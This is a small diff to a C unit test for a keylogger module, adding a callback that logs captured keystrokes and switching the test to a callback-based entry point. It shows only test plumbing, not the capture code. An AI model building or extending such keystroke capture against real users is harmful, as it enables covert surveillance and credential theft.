@@ -10,8 +10,12 @@
 
 //////////////////////////////////////////////
 
+void callback(char *KEYS){
+  log_info("callback> %s", KEYS);
+}
+
 TEST t_keylogger(){
-  int res = keylogger_exec();
+  int res = keylogger_exec_with_callback(callback);
 
   ASSERT_EQm("keylogger_exec failed", res, 0);
   PASS();
